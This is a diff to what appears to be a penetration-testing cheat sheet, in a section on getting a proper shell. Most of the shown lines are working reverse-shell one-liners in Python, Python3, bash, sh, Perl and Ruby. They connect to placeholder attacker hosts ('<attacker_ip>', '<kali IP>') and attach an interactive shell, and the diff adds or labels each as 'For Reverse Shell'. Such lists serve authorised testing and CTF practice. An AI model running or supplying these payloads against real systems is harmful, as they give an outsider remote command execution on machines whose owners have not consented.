@@ -103,13 +103,15 @@ ls /usr/share/applications/
 - If you don't have proper shell then try this command if it having python or bash or sh
 ```bash
 python -c 'import pty; pty.spawn("/bin/bash");'
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker_ip>",<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' - **For Reverse Shell**
 python3 -c 'import pty; pty.spawn("/bin/bash");'
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker_ip>",<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);' - **For Reverse Shell**
 sh -i
 bash -i
-bash -i >& /dev/tcp/<kali IP>/1234 0>&1
-sh -i >& /dev/tcp/<kali IP>/1234 0>&1
+bash -i >& /dev/tcp/<kali IP>/1234 0>&1 - **For Reverse Shell**
+sh -i >& /dev/tcp/<kali IP>/1234 0>&1 - **For Reverse Shell**
 perl -e 'exec "/bin/bash";'
-perl -e 'use Socket;$i="<attacker_ip>";$p=<port>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+perl -e 'use Socket;$i="<attacker_ip>";$p=<port>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' - **For Reverse Shell**
 ruby -e 'exec "/bin/bash"'
-ruby -rsocket -e 'exit if fork;c=TCPSocket.new("<attacker_ip>",<port>);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+ruby -rsocket -e 'exit if fork;c=TCPSocket.new("<attacker_ip>",<port>);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end' - **For Reverse Shell**
 ```
